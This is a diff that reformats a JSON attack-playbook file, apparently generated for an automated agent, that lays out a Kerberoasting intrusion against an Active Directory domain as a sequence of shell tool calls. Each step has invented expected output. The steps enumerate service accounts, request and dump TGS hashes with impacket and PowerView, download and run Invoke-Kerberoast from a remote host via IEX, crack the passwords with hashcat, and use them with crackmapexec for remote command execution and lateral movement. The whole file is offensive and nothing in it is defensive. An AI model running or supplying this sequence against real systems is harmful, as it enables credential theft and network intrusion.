@@ -2,37 +2,147 @@
   "name": "kerberoasting_attacks",
   "description": "Kerberoasting to extract and crack service account credentials",
   "pattern": "kerberoast|spn.*enum|service.*ticket|tgs.*crack",
-  "parameters": ["domain", "username", "password"],
+  "parameters": [
+    "domain",
+    "username",
+    "password"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "powershell", "args": ["-c", "Import-Module .\\PowerView.ps1; Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname"]},
-      "expected_output": {"type": "string", "example": "samaccountname serviceprincipalname\n-------------- --------------------\nsqlservice     {MSSQLSvc/DB-01.corp.local:1433, MSSQLSvc/DB-01.corp.local}\nsvc-web        {HTTP/web.corp.local, HTTP/WEB-01.corp.local}\nsvc-exchange   {exchangeMDB/EXCH-01.corp.local, exchangeRFR/EXCH-01.corp.local}\nbackup_svc     {TERMSRV/FILE-01.corp.local}\n\nService accounts with SPNs:\n  sqlservice: SQL Server (MSSQLSvc)\n  svc-web: IIS Web Server (HTTP)\n  svc-exchange: Exchange Server\n  backup_svc: Terminal Services\n\nTotal: 4 kerberoastable accounts\nTarget for TGS ticket extraction and offline cracking"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "Import-Module .\\PowerView.ps1; Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "samaccountname serviceprincipalname\n-------------- --------------------\nsqlservice     {MSSQLSvc/DB-01.corp.local:1433, MSSQLSvc/DB-01.corp.local}\nsvc-web        {HTTP/web.corp.local, HTTP/WEB-01.corp.local}\nsvc-exchange   {exchangeMDB/EXCH-01.corp.local, exchangeRFR/EXCH-01.corp.local}\nbackup_svc     {TERMSRV/FILE-01.corp.local}\n\nService accounts with SPNs:\n  sqlservice: SQL Server (MSSQLSvc)\n  svc-web: IIS Web Server (HTTP)\n  svc-exchange: Exchange Server\n  backup_svc: Terminal Services\n\nTotal: 4 kerberoastable accounts\nTarget for TGS ticket extraction and offline cracking"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "impacket-GetUserSPNs", "args": ["corp.local/john.doe:P@ssw0rd123", "-dc-ip", "10.10.10.10", "-request"]},
-      "expected_output": {"type": "string", "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\nServicePrincipalName                   Name         MemberOf                                              PasswordLastSet             LastLogon                   Delegation\n-------------------------------------  -----------  ----------------------------------------------------  --------------------------  --------------------------  ----------\nMSSQLSvc/DB-01.corp.local:1433         sqlservice   CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-06-10 08:15:22.745231  2024-01-15 02:10:05.123456\nHTTP/web.corp.local                    svc-web      CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-08-05 16:30:15.234567  2024-01-15 12:05:30.987654\nexchangeMDB/EXCH-01.corp.local         svc-exchange CN=Exchange Servers,CN=Users,DC=corp,DC=local        2022-12-01 10:20:30.456789  2024-01-14 18:45:12.345678\nTERMSRV/FILE-01.corp.local             backup_svc   CN=Backup Operators,CN=Builtin,DC=corp,DC=local       Never                       Never\n\n\n$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6$8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d\n\n$krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*$f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4$3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7\n\nTGS tickets extracted for all 4 accounts!\n\nSave hashes to file:\n  kerberoast_hashes.txt\n\nCrack with hashcat:\n  hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "impacket-GetUserSPNs",
+        "args": [
+          "corp.local/john.doe:P@ssw0rd123",
+          "-dc-ip",
+          "10.10.10.10",
+          "-request"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\nServicePrincipalName                   Name         MemberOf                                              PasswordLastSet             LastLogon                   Delegation\n-------------------------------------  -----------  ----------------------------------------------------  --------------------------  --------------------------  ----------\nMSSQLSvc/DB-01.corp.local:1433         sqlservice   CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-06-10 08:15:22.745231  2024-01-15 02:10:05.123456\nHTTP/web.corp.local                    svc-web      CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-08-05 16:30:15.234567  2024-01-15 12:05:30.987654\nexchangeMDB/EXCH-01.corp.local         svc-exchange CN=Exchange Servers,CN=Users,DC=corp,DC=local        2022-12-01 10:20:30.456789  2024-01-14 18:45:12.345678\nTERMSRV/FILE-01.corp.local             backup_svc   CN=Backup Operators,CN=Builtin,DC=corp,DC=local       Never                       Never\n\n\n$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6$8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d\n\n$krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*$f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4$3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7\n\nTGS tickets extracted for all 4 accounts!\n\nSave hashes to file:\n  kerberoast_hashes.txt\n\nCrack with hashcat:\n  hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "powershell", "args": ["-c", "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat | fl"]},
-      "expected_output": {"type": "string", "example": "TicketByteHexStream  : \nHash                 : $krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4e5f6...\nSamAccountName       : sqlservice\nDistinguishedName    : CN=SQL Service,CN=Users,DC=corp,DC=local\nServicePrincipalName : MSSQLSvc/DB-01.corp.local:1433\n\nTicketByteHexStream  :\nHash                 : $krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*$f9e8d7c6b5a4...\nSamAccountName       : svc-web\nDistinguishedName    : CN=Web Service,CN=Users,DC=corp,DC=local\nServicePrincipalName : HTTP/web.corp.local\n\nInvoke-Kerberoast PowerShell module:\n  Extracted TGS tickets for all SPNs\n  Format: Hashcat-compatible\n  \nSave hashes:\n  Invoke-Kerberoast | Export-Csv -NoTypeInformation kerberoast.csv"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "powershell",
+        "args": [
+          "-c",
+          "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat | fl"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "TicketByteHexStream  : \nHash                 : $krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4e5f6...\nSamAccountName       : sqlservice\nDistinguishedName    : CN=SQL Service,CN=Users,DC=corp,DC=local\nServicePrincipalName : MSSQLSvc/DB-01.corp.local:1433\n\nTicketByteHexStream  :\nHash                 : $krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*$f9e8d7c6b5a4...\nSamAccountName       : svc-web\nDistinguishedName    : CN=Web Service,CN=Users,DC=corp,DC=local\nServicePrincipalName : HTTP/web.corp.local\n\nInvoke-Kerberoast PowerShell module:\n  Extracted TGS tickets for all SPNs\n  Format: Hashcat-compatible\n  \nSave hashes:\n  Invoke-Kerberoast | Export-Csv -NoTypeInformation kerberoast.csv"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hashcat", "args": ["-m", "13100", "kerberoast_hashes.txt", "/usr/share/wordlists/rockyou.txt", "--force"]},
-      "expected_output": {"type": "string", "example": "hashcat (v6.2.5) starting...\n\nOpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]\n====================================================================\n\nHashes: 4 digests; 4 unique digests, 4 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nWatchdog: Temperature abort trigger set to 90c\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 2 secs\n\n$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4...:SQLService2023!\n$krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*$f9e8d7c6...:WebP@ssword\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)\nHash.Target......: kerberoast_hashes.txt\nTime.Started.....: Mon Jan 15 17:30:15 2024 (45 secs)\nTime.Estimated...: Mon Jan 15 17:31:00 2024 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nSpeed.#1.........:   318.5 kH/s (8.52ms)\nRecovered........: 2/4 (50.00%) Digests\nProgress.........: 14344385/14344385 (100.00%)\nRejected.........: 0/14344385 (0.00%)\n\nKerberoasting successful!\n  sqlservice: SQLService2023!\n  svc-web: WebP@ssword\n  \nUse credentials for:\n  - Lateral movement to SQL/Web servers\n  - Service account privilege abuse\n  - Further domain enumeration"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "hashcat",
+        "args": [
+          "-m",
+          "13100",
+          "kerberoast_hashes.txt",
+          "/usr/share/wordlists/rockyou.txt",
+          "--force"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "hashcat (v6.2.5) starting...\n\nOpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]\n====================================================================\n\nHashes: 4 digests; 4 unique digests, 4 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nWatchdog: Temperature abort trigger set to 90c\n\nDictionary cache built:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 2 secs\n\n$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4...:SQLService2023!\n$krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*$f9e8d7c6...:WebP@ssword\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)\nHash.Target......: kerberoast_hashes.txt\nTime.Started.....: Mon Jan 15 17:30:15 2024 (45 secs)\nTime.Estimated...: Mon Jan 15 17:31:00 2024 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nSpeed.#1.........:   318.5 kH/s (8.52ms)\nRecovered........: 2/4 (50.00%) Digests\nProgress.........: 14344385/14344385 (100.00%)\nRejected.........: 0/14344385 (0.00%)\n\nKerberoasting successful!\n  sqlservice: SQLService2023!\n  svc-web: WebP@ssword\n  \nUse credentials for:\n  - Lateral movement to SQL/Web servers\n  - Service account privilege abuse\n  - Further domain enumeration"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "crackmapexec", "args": ["mssql", "10.10.10.20", "-u", "sqlservice", "-p", "SQLService2023!", "-x", "whoami"]},
-      "expected_output": {"type": "string", "example": "SMB         10.10.10.20     1433   DB-01            [*] Windows Server 2016 Standard 14393 (name:DB-01) (domain:corp.local)\nMSSQL       10.10.10.20     1433   DB-01            [+] corp.local\\sqlservice:SQLService2023!\nMSSQL       10.10.10.20     1433   DB-01            [+] Executed command via mssqlexec\nMSSQL       10.10.10.20     1433   DB-01            corp\\sqlservice\n\nKerberoasted credentials validated!\n  Server: DB-01 (SQL Server)\n  Account: sqlservice\n  Access: Confirmed\n  Command execution: Successful\n\nNext steps:\n  - Enumerate SQL Server permissions\n  - Check for xp_cmdshell\n  - Look for linked servers\n  - Dump SQL databases"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "crackmapexec",
+        "args": [
+          "mssql",
+          "10.10.10.20",
+          "-u",
+          "sqlservice",
+          "-p",
+          "SQLService2023!",
+          "-x",
+          "whoami"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "SMB         10.10.10.20     1433   DB-01            [*] Windows Server 2016 Standard 14393 (name:DB-01) (domain:corp.local)\nMSSQL       10.10.10.20     1433   DB-01            [+] corp.local\\sqlservice:SQLService2023!\nMSSQL       10.10.10.20     1433   DB-01            [+] Executed command via mssqlexec\nMSSQL       10.10.10.20     1433   DB-01            corp\\sqlservice\n\nKerberoasted credentials validated!\n  Server: DB-01 (SQL Server)\n  Account: sqlservice\n  Access: Confirmed\n  Command execution: Successful\n\nNext steps:\n  - Enumerate SQL Server permissions\n  - Check for xp_cmdshell\n  - Look for linked servers\n  - Dump SQL databases"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "impacket-GetUserSPNs", "args": ["corp.local/john.doe:P@ssw0rd123", "-dc-ip", "10.10.10.10", "-request-user", "sqlservice"]},
-      "expected_output": {"type": "string", "example": "Impacket v0.10.0\n\nServicePrincipalName                   Name         MemberOf                                              PasswordLastSet             LastLogon\n-------------------------------------  -----------  ----------------------------------------------------  --------------------------  --------------------------\nMSSQLSvc/DB-01.corp.local:1433         sqlservice   CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-06-10 08:15:22.745231  2024-01-15 02:10:05.123456\nMSSQLSvc/DB-01.corp.local              sqlservice                                                         2023-06-10 08:15:22.745231  2024-01-15 02:10:05.123456\n\n$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6$...\n\nTargeted Kerberoasting:\n  User: sqlservice only\n  SPNs: 2 (MSSQLSvc with and without port)\n  \nAdvantages:\n  - Less noisy (single user)\n  - Focused attack\n  - Useful when you know high-value target"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "impacket-GetUserSPNs",
+        "args": [
+          "corp.local/john.doe:P@ssw0rd123",
+          "-dc-ip",
+          "10.10.10.10",
+          "-request-user",
+          "sqlservice"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Impacket v0.10.0\n\nServicePrincipalName                   Name         MemberOf                                              PasswordLastSet             LastLogon\n-------------------------------------  -----------  ----------------------------------------------------  --------------------------  --------------------------\nMSSQLSvc/DB-01.corp.local:1433         sqlservice   CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-06-10 08:15:22.745231  2024-01-15 02:10:05.123456\nMSSQLSvc/DB-01.corp.local              sqlservice                                                         2023-06-10 08:15:22.745231  2024-01-15 02:10:05.123456\n\n$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6$...\n\nTargeted Kerberoasting:\n  User: sqlservice only\n  SPNs: 2 (MSSQLSvc with and without port)\n  \nAdvantages:\n  - Less noisy (single user)\n  - Focused attack\n  - Useful when you know high-value target"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "impacket-GetUserSPNs", "args": ["corp.local/john.doe:P@ssw0rd123", "-dc-ip", "10.10.10.10", "-outputfile", "kerberoast.txt"]},
-      "expected_output": {"type": "string", "example": "Impacket v0.10.0\n\nServicePrincipalName                   Name         MemberOf                                              PasswordLastSet             LastLogon\n-------------------------------------  -----------  ----------------------------------------------------  --------------------------  --------------------------\nMSSQLSvc/DB-01.corp.local:1433         sqlservice   CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-06-10 08:15:22.745231  2024-01-15 02:10:05.123456\nHTTP/web.corp.local                    svc-web      CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-08-05 16:30:15.234567  2024-01-15 12:05:30.987654\n\nHashes saved to file: kerberoast.txt\n\ncat kerberoast.txt:\n$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4...\n$krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*$f9e8d7c6b5a4...\n\nFile output:\n  Hashes saved to kerberoast.txt\n  Ready for offline cracking\n  Transfer to cracking rig\n  \nCrack with John the Ripper:\n  john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "impacket-GetUserSPNs",
+        "args": [
+          "corp.local/john.doe:P@ssw0rd123",
+          "-dc-ip",
+          "10.10.10.10",
+          "-outputfile",
+          "kerberoast.txt"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "Impacket v0.10.0\n\nServicePrincipalName                   Name         MemberOf                                              PasswordLastSet             LastLogon\n-------------------------------------  -----------  ----------------------------------------------------  --------------------------  --------------------------\nMSSQLSvc/DB-01.corp.local:1433         sqlservice   CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-06-10 08:15:22.745231  2024-01-15 02:10:05.123456\nHTTP/web.corp.local                    svc-web      CN=Service Accounts,CN=Users,DC=corp,DC=local         2023-08-05 16:30:15.234567  2024-01-15 12:05:30.987654\n\nHashes saved to file: kerberoast.txt\n\ncat kerberoast.txt:\n$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*$a1b2c3d4...\n$krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*$f9e8d7c6b5a4...\n\nFile output:\n  Hashes saved to kerberoast.txt\n  Ready for offline cracking\n  Transfer to cracking rig\n  \nCrack with John the Ripper:\n  john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
